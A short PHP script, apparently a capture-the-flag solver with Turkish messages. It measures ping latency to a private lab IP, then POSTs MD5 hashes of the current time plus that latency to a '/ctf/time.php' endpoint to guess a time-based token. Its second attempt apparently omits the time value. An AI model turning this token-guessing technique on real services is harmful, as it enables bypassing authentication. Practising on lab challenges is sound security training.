<?php
	$domain = "10.47.159.32";
	echo "Ortalama istek zamanı hesaplanıyor....";
	$pingData = shell_exec("ping -c 3 ".$domain);
	preg_match("/.*\/(.*)\/.*\/.* ms/",$pingData,$returnData);
	$pingTime = $returnData[1];
	$pingTime = round($pingTime / 1000);
	$md5Time = md5(time()+$pingTime);
	echo "Ortalama istek süresi : {$pingTime} saniye \nIstek hazırlanıyor...\n";
        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, $domain."/ctf/time.php"); 
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS,"time=".$md5Time);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	echo "Istek gönderiliyor\nDeneme-1\n";
        $output = curl_exec($ch); 
	var_dump($output);
	curl_setopt($ch, CURLOPT_POSTFIELDS,"time=".md5($pingTime +1));
	$output = curl_exec($ch);
	echo "\nDeneme-2\n"; 
	var_dump($output);
        curl_close($ch);      
?>
